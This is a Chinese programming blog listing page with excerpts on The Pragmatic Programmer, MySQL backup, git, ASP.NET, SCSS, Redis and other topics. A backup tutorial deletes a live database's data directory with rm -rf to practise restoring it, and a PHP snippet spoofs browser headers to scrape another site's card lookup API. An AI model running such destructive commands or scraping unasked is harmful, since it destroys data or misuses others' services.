从《程序员的修炼之道》这本书的介绍部分可以看出，该书是一本很棒的作品，该书由一系列独立的部分组成，讲述了许多富有娱乐性的奇闻轶事、有思想性的例子、以及有趣的类比，内容丰富多彩，并且本书还阐明了软件开发的许多不同方面的最佳实践和重大陷阱，无论是初学者还是有经验的编程员，都能从中获益。书中更是例举了许多程序员对这本书的看法，从他们的介绍中让我认识到这本书对一个程序员的重要性，值得每一个学习编程 的人去阅读，去学习，无论是编程小工还是编程专家，这本书最终都能成为有用信息的极好来源。从序论中让我了解到编程是一种技艺，用最简单的话说，编程可归结为让计算机做你想让它做的事情，作为程序员，你既是倾听者又是顾问，既是解释者又是发号施令者，编程是艰难的工作，要注重实效，我们也要学这从编程中寻找乐趣、寻找方法。
该书的第一章讲的是注重时效的哲学。注重时效的程序员不仅有方法，更有责任。他们能够越出直接的问题去思考，总是设法把问题放在更大的语境中，总是设法注意更大的图景。他们成功的另一关键就是他们对他们所作的每一件事情负责。该章节先用“我们的源码让猫给吃了”生动幽默的写出来程序员的源码丢失问题，然后为我们介绍了责任问题，注重实效的程序员对他或她自己的职业生涯负责，并且不怕承认无知和错误。即使是在最好的项目中，失误也在所难免，发生这样的的事情，我们要尽可能的职业的处理它们，这意味这我们要有诚实坦率的品质，作为一个合格的程序员，我们可以为我们的能力而自豪，但对于我们的缺点、我们的无知和我们的错误，我们必须诚实。负责是我们必须主动承担的东西。紧接着，该书为我们介绍了软件的熵，为我们介绍了熵在软件编程中为我们带来的影响，熵是一个来自物理的定义，指的是某个系统中无序的总量，当软件中的无序增长时，程序员们称为“软件腐烂”，然后又引用“破窗户”和“灭火”等故事的道理，说明了程序中的代码，如果一个团队写的代码十分漂亮整洁，设计整洁优雅，那么你就很可能注意不把它“弄脏”，因为谁也不想成为第一个弄脏东西的人。然后给我们讲了两个故事“石头汤”“温水煮青蛙”，“石头汤”讲述了三个士兵用石头煮出一锅美味的汤，让人们饱餐一顿的故事，从一开始的石头煮汤，然后再由人们各自都出一点食材，最后煮出了一锅美味的大餐。任何事情都是从零开始的，任何成绩都是一点一点的积累起来的，做项目亦是如此，一个团队，每个人都出一点的力，发挥自己的特长，最后组合起来，这就是一个完美的项目，团队的每一个人都是赢家。由此可以看出，团队的合作是非常重要的。再者“温水煮青蛙”讲的是，把一只青蛙放进热水里，青蛙会跳出来，而放进温水里慢慢煮，就会把青蛙煮熟，该故事告诉我们，不要像青蛙一样，要留心大图景，要持续不断的观察周围发生的事情，而不只是你自己在做的事情。一个足够好的软件不是所谓的代码足够整洁，而是可以使制作的软件能够满足用户的需求，这样才能取得成功，所以我们应该给用户机会，让用户参与权衡，再者我们应该知道要何时止步，不要因为过度修饰和过于求精而毁损完好的程序。作为一个好的程序员，我们也要学会如何去管理和经营自己的知识资产，定一个目标，阅读更多的书籍，抓住学习机会等，然后批判性的思考你学到的和听到的。然而作为一个合格者，我们也要学会交流，知道你想要说什么，了解你的听众，选择时机、风格，让文档美观，让听众参与，做倾听者，同时回复他人。
以上就是我从这本书中的第一章里的所得所感，让我收益颇丰。
转载于:https://www.cnblogs.com/zwx655/p/11605862.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d2ac0dc1db86a07fcbf0f071099d505/" rel="bookmark">
			XBK学习day11
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		XBK(Percona-Xtrabackup)-物理备份工具 1.1下载并安装Xtrabackup工具 安装依赖包：
wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo yum -y install perl perl-devel libaio libaio-devel perl-Time-HiRes perl-DBD-MySQL libev 下载软件并安装 yum -y install percona-xtrabackup-24-2.4.12-1.el7.x86_64.rpm 安装一个依赖包
yum install -y perl-Digest-* 2.2 介绍 物理备份工具，类似于cp数据
2.3 备份细节 非InnoDB:例如MyISAM，自动锁表备份,会有短暂的全局锁。
InnoDB:
1.立即进行CKPT,将当前所有已提交事务的脏页，立即刷写到磁盘上。
2.拷贝所有InnoDB的数据文件
3.将备份过程中产生的redo截取并备份走。
2.4 innobackupex 备份应用 2.4.1 配置文件设置: [client] socket=/tmp/mysql.sock 2.4.2 全备 [root@db01 /backup]# innobackupex --user=root --password=123 /backup/xbk [root@db01 /backup]# innobackupex --user=root --password=123 --no-timestamp /backup/xbk/full 2.4.3 搞破坏 全备恢复 [root@db01 ~]# pkill mysqld [root@db01 ~]# \rm -rf /data/3306/data/* 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d2ac0dc1db86a07fcbf0f071099d505/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba9f11ecc3497d9993b933fdc2bd61e5/" rel="bookmark">
			git
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.目录2.git 2.1 创建本地的版本库2.2 工作区编写代码，编写完毕之后把代码存入到暂存区2.3 查看当前git的状态2.4 把暂存区的代码提交到版本库中2.5 配置git用户信息2.6 创建远程仓库2.7 上传本地仓库的代码到远程仓库2.8 配置ssh秘钥2.9 项目组成员克隆远程的代码（仅此一次）2.10 项目组成员更新自己的代码3.模块化开发 1.目录 2.git Git是目前世界上最先进的 分布式版本控制 系统（没有之一）。
集中式 VS 分布式
集中式： SVN 1
版本库是集中存放在中央服务器,必须联网才能工作，如果一旦中央服务器出问题......
分布式: GIT 9
分布式版本控制系统 根本没有 “中央服务器”,每一台电脑就是一个版本库，安全性要高很多
2.1 创建本地的版本库 git init 创建出一个版本库，名字叫 .git,默认是一个隐藏文件夹，想要看到，要设置可以查看隐藏的文件夹
2.2 工作区编写代码，编写完毕之后把代码存入到暂存区 工作区
就是你在电脑里能看到的目录，你写的代码就是在工作区暂存区
你写完代码，通过git指令，把代码添加到暂存区中
git add readme.md (如果没有任何的输出，那么说明没有问题---没有消息的消息是最好的消息，有消息就是坏消息)
如果你一次性修改了很多个文件
git add a.txt b.txt test/c.txt git add . 2.3 查看当前git的状态 git status 如果代码更改并没有添加到暂存区
modified: readme.md （红色）
如果代码更改后添加到了暂存区
new file: readme.md （绿色）
2.4 把暂存区的代码提交到版本库中 git commit -m '添加到版本库' 如果你是第一次安装使用git，此处会让你配置用户信息,配置完成之后再次提交代码到版本库
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba9f11ecc3497d9993b933fdc2bd61e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/464186afb2f8405b45c6023374ac3a62/" rel="bookmark">
			Stern-Brocot Tree、伪.GCD 副本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Stern-Brocot Tree、伪.GCD 副本 伪.GCD 问题 1：\(f(a,b,c,n) = \sum_{i=0}^{n} [\frac{ai+b}{c}]\) code
问题 2：求 \(\frac{a}{b}&lt;\frac{x}{y}&lt;\frac{c}{d}\)，的最小正整数解 \(y\). Stern-Brocot Tree 提问：xxxxxx 问题的答案是 \(\frac{p}{q}\) (\(p \leq 10^6, q \leq 10^5\))，怎么二分？ 答：我可以二分一个实数 ........ 然后 ....... 睡觉。
做法 solve(a,b,c,d) 在 \([\frac{a}{b},\frac{c}{d}]\) 中寻找答案。
check 一下 \(\frac{a+c}{b+d}\)。小了的话，沿着 SB 树向右下方突突突。二分求出极小的 \(k\)，使得 \(\frac{a+kc}{b+kd}\) 大于等于正确答案。solve(a,b,a+kc,b+kd)大了的话，沿着 SB 树向右下方突突突。二分求出极小的 \(k\)，使得 \(\frac{ka+c}{kb+d}\) 小于等于正确答案。solve(ka+c,kb+d,c,d) 练习 It's a Mod, Mod, Mod, Mod World
\(\sum_{i=1}^{n} pi\%q = \sum_{i=1}^{n}(pi-q[\frac{pi}{q}]) = \frac{pn(n+1)}{2} - q\sum_{i=1}^{n}[\frac{pi}{q}]\) Rikka with Ants
对于直线 \(y=\frac{a}{b}x\)，点 \((x,y)\) 在路径上，那么 \(\frac{y}{x} \leq \frac{a}{b}, \frac{y+1}{x-1}&gt;\frac{a}{b}\)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/464186afb2f8405b45c6023374ac3a62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7162a4626a15077485e5eda0ccedf23/" rel="bookmark">
			Asp.Net Core2.0&#43;Vs2017&#43;MVC 学习 二 中间件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		继续用上次修改后的Configure方法为例
public void Configure(IApplicationBuilder app, IHostingEnvironment env, IWelcomeSeriver welcomeSeriver)//还可以自定义接口,,依赖注入，注意自定义的接口必须注册，不然找不到 { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); } app.Run(async (context) =&gt; { string welcome = welcomeSeriver.GetWelcomeMessage();//这里获取配置文件的优先级应该是，命令行&gt;系统变量&gt;开发环境配置文件&gt;配置文件 await context.Response.WriteAsync(welcome); }); } 在实际项目中，很少使用app.Run方法，一般这个方法里只配置简单的中间件。
----------------------------------------------------------------------------------------------------------------------------
通常使用，app.UseXXXX的方法，而相应的方法也通常都把实现封装起来了，用起来也挺方便。
例如 app.UseWelcomePage(); 代码执行到它，就截断返回一个欢迎页，也可以设置欢迎页的路由。
app.UseWelcomePage(new WelcomePageOptions { Path = "/MyWelcome" }); 访问 localhost:xxxx/MyWelcome时，返回一个欢迎页。
--------------------------------------------------------------------------------------------------------------------------------
也可以直接使用app.Use(),这里写个例子
public void Configure(IApplicationBuilder app, IHostingEnvironment env, IConfiguration configuration) { //if (env.IsDevelopment()) //{ // app.UseDeveloperExceptionPage(); //} //next是一个RequestDelegate对象，代表的是管道里的下一个中间件 app.Use(next =&gt; {
//到这里为止，只会执行一次 return async httpContext =&gt; {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7162a4626a15077485e5eda0ccedf23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d711b55165b29776dc8996509be4c9f8/" rel="bookmark">
			scss
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、回顾gulp的使用方法2、sass语法 2.1 css的编译模式2.2 sass介绍2.3 如何使用scss3、sass用法 3.1 安装 sass 模块3.2 配置处理scss文件gulp的任务4、学习scss 语法 4.1 学习scss的注释语句4.2 变量 4.2.1 单值变量4.2.2 scss做四则运算4.2.3 多值变量4.2.4 复杂变量 - 循环4.3 scss嵌套4.4 mixin 混入4.5 扩展 / 继承4.6 函数4.7 条件判断4.8 导入另一个scss文件 1、回顾gulp的使用方法 2、sass语法 2.1 css的编译模式 css --- 普通sass / scss --- 高效 // *********less --- 高效 2.2 sass介绍 来源： ruby语言基础的版本，后缀名为sass：没有{},只能通过缩进来实现 -- 可读性差、难以维护 // css .box {width: 100px} // .sass .box width: 100px; // 据说是这样 .scss 后缀 --- 可读性高、便于维护 html { background: red } // scss语法--嵌套 --- 权重 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d711b55165b29776dc8996509be4c9f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0c899f34661399866dd93ce8cf65d58/" rel="bookmark">
			php curl模拟 浏览器 伪装客户端 访问 真实可用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者最近有个需求，爬取别人的网站的卡的 归属银行，发现这个接口挺好用，就想了个办法模拟访问获取
public function getUrlContent() { $origin = 'http://www.lianhanghao.com'; //目标网址 $referer = $origin . "/cardbin.html";//当前页面 $apiUrl = $origin . "/admin/api/getBankdata";//请求的api地址 $data = ['cardno' =&gt; ''];//此处填写的是银行卡或者信用卡的卡号 //注意了，这里的hear信息比较关键， 请先用ajax测试访问成功，然后把请求信息复制过来替换 $header = [ 'Accept: application/json, text/javascript, */*; q=0.01', // 'Accept-Encoding: gzip, deflate, br', 'Accept-Language: zh-CN,zh;q=0.9', 'Connection: keep-alive', 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8', // 'Cookie: PHPSESSID=340abf1a618653fef13589101044e994; ZDEDebuggerPresent=php,phtml,php3; CNZZDATA1583751=cnzz_eid%3D572091052-1569547668-%26ntime%3D1569553068', // 'Host: localhost_mlf.com', 'Origin: ' . $origin, 'Referer:' . $referer, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0c899f34661399866dd93ce8cf65d58/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd6e0156e9eb174464d6c6a2f1e09e10/" rel="bookmark">
			项目经理的商务指南系列之二：认识责任（敏捷开发，专家与杂家）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文是项目经理的商务指南系列中的第一篇。（之一：序言及项目本质，之二：认识责任，之三：认识客户，之四：认识谈判，之五：认识项目进展，之六：认识回款，之七：将项目推向不败之地）
认识责任 本系列的名称为：项目经理的商务指南。我们好端端地做项目管理，商务自有销售来管理，为什么要我们管这个呢？这要从另外一个事情谈起。
现在的项目经理，多数在之前是普通的程序员。那么，有没有项目经理想回到程序员的呢？肯定不多。为什么没有人愿意把“本来是别人做的管理工作”扔掉之负责技术呢？当然不是因为想承担管理责任，这是想保持管理权利。
同样的，项目经理常常抱怨没有商务权力，等自己接手项目的时候，一切前因后果都已经敲定了；当项目好不容易完成的时候，努力半天回款也没自己的份。但是很少见到项目经理抱怨没有商务责任的，每个人都希望把责任推得一干二净到销售身上，殊不知这就是项目经理们没有商务权力和商务利益的本因。
因此要从责权利统一的角度看待责任。
认识专业性 又有一些项目经理说：我希望做专业的项目经理，不想当杂家。但其实如果问：你做项目管理有哪些专业技能？又答不上来。
假使我们不从懒惰怕事的角度看待这个矛盾，而是从“如何成为专业的项目经理”角度看待专家与杂家，结果应该如何呢？
百度词条上“专家”的定义是：专家，指具备专业技能，并依赖此类技能为生的职业人士。
很多人把它理解为“具备专一乃至单一技能，并依赖此类技能卫生的职业人士”，是明显的错误。
其实最好的程序员，一定熟悉业务；最好的产品经理，一定熟悉市场；最好的项目经理，也一定熟悉商务。
商务技能，是项目经理所需要具备的专业技能之一；销售人员需要用项目管理技能来加强自己的商务技能；项目经理要用商务技能来加强自己的项目管理技能。
认识项目的本质 上一章节我们提到了项目的本质是互利的交易，是购买价值的过程。
前者要求我们必须以交易的眼光来看待项目，没有商务知识是不可能完成的。
后者要求我们按照“价值”而非“进度、质量、成本”来看待项目。“进度、质量、成本”不就是价值吗？是，也不是。用“手机的功能、价格不就是价值吗”来帮助理解，会容易一些：世界上有功能很少，价格昂贵的手机在热销，就必有进度很迟、质量很差、成本很高的项目在结项回款。
到这里，基本上就说明了商务的确是项目管理最重要的辅助知识。
不过说归说，在开发人员眼中最讨厌的人是销售，比销售更讨厌的是客户。怎样越过心理的障碍，与客户打交道呢？下一篇文章将提及此事。
点击下载免费的敏捷开发教材：《火星人敏捷开发手册》
转载于:https://www.cnblogs.com/JPAORM/archive/2011/10/07/2510429.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e35cc2db7a1b03f81a2833b3b75f1d16/" rel="bookmark">
			Visual Studio中头文件stdafx.h的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在较新版的Visual Studio中，新生成的C++项目文件的的头文件夹下会默认有头文件stdafx.h，而源文件夹下则默认有源文件stdafx.cpp，手动将这些文件删除后，编译时系统还会报错。下面记录笔者了解到的关于头文件stdafx.h的信息。
使用预编译头 stdafx.h并不是标准C++头文件，也就是说，该文件本质上相当于自定义的一个头文件( 这里是VS默认自定义的文件)，与项目的源代码文件存放在同一个文件文件夹下，通过#include"stdafx.h"引用；
从内容上来说，头文件stdafx.h中可以包含
1.标准系统包含文件
2.经常使用的但不常更改的特定于项目的包含文件
标准系统包含文件 : 即常用的与C标准库对应的头文件，如标准输入头文件stdio.h、字符串头文件string.h等文件。
自定义的包含文件 : 即用户根据项目需要自定义的头文件。
在使用头文件 stdafx.h 时，将所有源程序中所需的包含文件( .h 文件 )都包含在头文件stdafx.h中，具体的做法就是将原本各个文件中所需要的类似于#include&lt;stdio.h&gt;的头文件包含语句都存放在头文件stdfax.h中，之后各个单独的文件中不需要再对存在于stdafx.h中的头文件进行单独声明，而只需要包含有头文件stdafx.h即可。
#include"stdafx.h"　//通过该语句包含头文件stdafx.h，该语句需放在每个源文件文件的开头，否则会报错 同时，stdafx.h也可以存放内容改动较少的自定义的头文件。
相应的，源文件stdafx.cpp中内容仅包含以下语句。
#include "stdafx.h"　//事实上，stdfax.cpp只用于编译头文件stdafx.h中包含的所有内容 事实上，stdafx.cpp只用于编译头文件stdafx.h中包含的所有内容。
开启/关闭预编译头 选中目标项目，右键 -&gt; 属性 -&gt; C/C++ -&gt; 预编译头，在右侧的选项中可以修改预编译头的相关设置。
1.可以修改选项为使用/不使用预编译头，从而开启/关闭预编译头机制；
2.可以修改预编译头文件的名字(预编译头是一种机制，具体的头文件名是可以自行指定的)；
3.修改预编译头输出文件的路径；
实际上，每个单独的源文件中均存在关于预编译头的属性，用于指定不同的编译策略，可供使用者自行选择。特别的，源文件stdafx.cpp的预编译头属性栏应设置为 创建(/Yc)，这样设置表示预编译头是由该源文件生成，而被其他文件使用。
预编译头的原理 在标准头文件中，往往包含有大量的函数声明、宏定义等方面的内容。一方面，原始预处理过程会将实际头文件的内容复制到源程序中，这给编译过程增加很大的开销；另一方面，多个不同的单独的源文件可能会重复声明头文件的包含关系来满足传统的函数声明的要求，这也给编译器带来了重复劳动。另外，当文件发生修改时，整个文件需要重新编译，而作为文件中内容不会更改的头文件的内容也需要重新编译，造成不必要的开销。为了降低在编译过程中诸如此类不必要的开销，引入了预编译头的机制。
在编译过程中，stdafx.cpp和stdafx.h文件用于生成一个预编译头文件 project.pch和预编译类型文件stdafx.obj。
如前面提到的，stdafx.cpp存放的是#include “stdafx.h”。在第一次编译过程中，stdafx.cpp首先被编译处理，将头文件stdafx.h中包含的所有的头文件进行预编译，从而生成一个预编译头文件project.pch，在之后的编译过程中，只要stdafx.h没有被修改(时间戳没有发生改变)，则编译器可以直接使用预编译头文件project.pch的内容，而不需要重新编译stdafx.h。之后的每个包含有stdafx.h头文件的独立文件编译过程都会使用该pch文件中的内容，即一次集中编译头文件后，之后可重复使用。
实际上，生成预编译头文件同样是耗时的，但是在后续的修改编译过程中，只要没有修改stdafx.h和stdafx.cpp文件的内容，就不需要重新生成预编译头文件，也就避免了许多头文件处理的过程，从而大大减少了传统重复处理头文件的开销。相应的，由于预编译头文件包含有众多头文件的处理信息，故而其本身会占用较大的存储空间，故而可以注意清理不需要的预编译头。
一般来说，将被项目中多个独立文件引用的标准头文件和特定项目中一般不做修改的头文件放在stdafx.h中可以大大提升程序编译时的效率。
关于报错 在使用预编译头机制时，可能会遇到一些问题
1. 无法打开预编译头文件"xxx.pch":no such file or directory 的问题
分析：根据上面的原理解释，可能是由于编译器无法通过stdafx.cpp创建一个预编译文件，从而其他文件没有办法去引用该pch文件。
解决方案：选中源文件stdafx.cpp，右键 -&gt; 属性 -&gt; C/C++ -&gt; 预编译头，出现上述问题一般是由于预编译头的选项从 创建 变为了 使用 ，通过将选项重新改为创建可解决问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e35cc2db7a1b03f81a2833b3b75f1d16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e6926aae65b960e18a9fe2d1e031d91/" rel="bookmark">
			VBA程序 在PPT中使用宏命令删除空白的文本框
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打开PPT，切换到视图菜单下，点击宏，输入宏的名称(如clear)，点击创建。进入命令窗口，复制以下命令编译执行即可。
Sub clear() Dim found As Boolean Dim textflag As Boolean Dim trng As TextRange Do found = False For Each Sld In ActivePresentation.Slides For Each shp In Sld.Shapes If shp.HasTextFrame Then textflag = False If shp.TextFrame.HasText Then Set trng = shp.TextFrame.TextRange For i = trng.Characters.Count To 1 Step -1 If trng.Characters(i) &lt;&gt; " " Then textflag = True Exit For End If Next End If If shp.Type &lt;&gt; 1 Then If Not shp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e6926aae65b960e18a9fe2d1e031d91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecc8c0362cf21d0d8a2bf25327ff300a/" rel="bookmark">
			MySQL存储引擎
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL的存储引擎种类很多，有MyISAM、InnoDB、Archive、Blackhole、CSV、Memory、Merge、NDB等。以下主要介绍MyISAM和InnoDB。
MyISAM
在MySQL 5.1之前的版本，MyISAM是默认的存储引擎。MyISAM提供了大量的特性，包括全文索引、压缩、空间函数（GIS）等，但MyISAM不支持事务、不支持外键、不支持行级锁（仅支持表级锁）。特点是访问速度快，对事务完整性没有要求。以select、insert为主的应用基本上都可以用这个引擎来创建表。MyISAM类型的表可能会损坏，原因可能多种多样。可以通过check table语句检查MyISAM表的健康，并用repair table语句修复一个损坏的MyISAM表。
MyISAM表磁盘上存储成3个文件，其中文件名和表名一致，但扩展名分别是：
.frm(存储表定义)
.MYD(MyData，存储数据)
.MYI(MyIndex，存储索引)
MyISAM特性是：
1.加锁与并发：对整张表加锁，而不是针对行。读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但是在表有读取查询的同时，也可以往表中插入新的记录（这被称为并发插入）；
2.为保证效率，不支持事务处理；
3.count(*)时效率高，不用遍历全表，原因是该引擎会记录行数；
4.非聚簇索引，支持全文索引，索引数据和表数据分开存储；
InnoDB
支持事务，具有提交、回滚和崩溃恢复能力。默认行级锁，是基于聚簇索引建立的。聚簇索引对主键查询有很高的性能。不过它的二级索引中必须包含主键列，所以如果主键很大的话，其他索引都会很大。存储格式是平台独立的，可以将数据和索引文件复制到其他平台。
InnoDB存储方式：
1.使用共享表空间存储，这种创建的表，表结构数据保存在.frm文件中，数据和索引数据保存在innodb_data_home_dir和innodb_data_file_path定义的表中间，可以是多个文件；
2.使用多表空间存储，这种方式创建的表，表结构数据仍然存在.frm文件中，但是每个表的数据和索引单独保存在.ibd中，如果是个分区表，则每个分区对应单独的.ibd中，文件名是“表名+分区名”，可以在创建分区的时候指定每个分区的数据文件位置，以此来将表的IO均匀分布在多个磁盘中；
InnoDB特性是：
1.事务安全；
2.行级锁，为承受高并发增加了竞争力；
3.count(*)时效率低，遍历表计算数量；
4.聚簇索引，主键默认为聚簇索引，没有主键时以第一列为聚簇索引，普通索引指向聚簇索引；
5.支持主键、外键。
转载于:https://www.cnblogs.com/caohongchang/p/11594980.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc743589fd594ee2c080fed403d50211/" rel="bookmark">
			MVC5使用T4模板建立Controller
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在程序包控制台输入install-package mvc5codetemplatescsharp为项目安装mvc5codetemplates
创建的myCreate.tt内容如下
&lt;#@ template language="C#" HostSpecific="True" #&gt;
&lt;#@ output extension=".cshtml" #&gt;
&lt;#@ include file="Imports.include.t4" #&gt;
@model &lt;#= ViewDataTypeName #&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta name="viewport" content="width=device-width" /&gt;
&lt;link href="~/layui/css/layui.css" rel="stylesheet" media="all" /&gt;
&lt;script src="~/layui/layui.js" charset="utf-8"&gt;&lt;/script&gt;
&lt;title&gt;&lt;#= ViewName #&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt; &lt;form class="layui-form" style = "padding-top:30px;padding-right:50px"&gt;
@Html.AntiForgeryToken() &lt;#
int i=0;
foreach (PropertyMetadata property in ModelMetadata.Properties) {
if (property.Scaffold &amp;&amp; !property.IsAutoGenerated &amp;&amp; !property.IsReadOnly &amp;&amp; !property.IsAssociation) {
#&gt; &lt;#
if (property.IsPrimaryKey &amp;&amp; IsPropertyGuid(property)) {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc743589fd594ee2c080fed403d50211/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/901b88fb0466b65d85cdcf10bceb9bf4/" rel="bookmark">
			gulp基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装淘宝镜像 npm install cnpm -g --registry=https://registry.npm.taobao.org
cnpm -v
2、生成项目描述文件 package.json npm init
cnpm init (可代替 npm init)
（需要项目名称、版本号、描述、入口文件、运行命令、作者、证书 ---- 一路按回车即可）
3、全局安装gulp cnpm i gulp@3 -g
全局安装gulp
@3 代表选择了 3 的版本
i 即为 install
-g 即为 --global
gulp -v
4、当前目录内部安装 gulp 模块 cnpm i gulp@3 -D
cnpm i gulp@3 -S （二者选择其一即可）
-D 缩写 --save-dev 开发依赖
-S 缩写 --save 项目依赖
开发依赖： 开发过程中需要使用到的依赖的模块，项目上线时不需要的模块 --- 代码格式校验的模块
项目依赖： 项目上线仍然需要使用的模块
----- 如果不知道怎么选择，那你就写 -S
5、创建文件 gulpfile.js ,配置gulp const gulp = require('gulp'); 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/901b88fb0466b65d85cdcf10bceb9bf4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb76bbcc4dab85aa72bf191fe5504e0c/" rel="bookmark">
			Redis注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，Redis支持多个数据库，并且每个数据库的数据是隔离的不能共享，并且基于单机才有，如果是集群就没有数据库的概念。
2，Redis是一个字典结构的存储服务器，而实际上一个Redis实例提供了多个用来存储数据的字典，客户端可以指定将数据存储在哪个字典中。这与我们熟知的在一个关系数据库实例中可以创建多个数据库类似，所以可以将其中的每个字典都理解成一个独立的数据库。
3，每个数据库对外都是一个从0开始的递增数字命名，Redis默认支持16个数据库（可以通过配置文件支持更多，无上限），可以通过配置databases来修改这一数字。客户端与Redis建立连接后会自动选择0号数据库，不过可以随时使用SELECT命令更换数据库，如要选择1号数据库：
redis&gt; SELECT 1 OK redis [1] &gt; GET foo (nil) 4，然而这些以数字命名的数据库又与我们理解的数据库有所区别。首先Redis不支持自定义数据库的名字，每个数据库都以编号命名，开发者必须自己记录哪些数据库存储了哪些数据。另外Redis也不支持为每个数据库设置不同的访问密码，所以一个客户端要么可以访问全部数据库，要么连一个数据库也没有权限访问。最重要的一点是多个数据库之间并不是完全隔离的，比如FLUSHALL命令可以清空一个Redis实例中所有数据库中的数据。综上所述，这些数据库更像是一种命名空间，而不适宜存储不同应用程序的数据。比如可以使用0号数据库存储某个应用生产环境中的数据，使用1号数据库存储测试环境中的数据，但不适宜使用0号数据库存储A应用的数据而使用1号数据库B应用的数据，不同的应用应该使用不同的Redis实例存储数据。由于Redis非常轻量级，一个空Redis实例占用的内存只有1M左右，所以不用担心多个Redis实例会额外占用很多内存。
转载于:https://www.cnblogs.com/3b2414/p/11592543.html
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/227/">«</a>
	<span class="pagination__item pagination__item--current">228/279</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/229/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>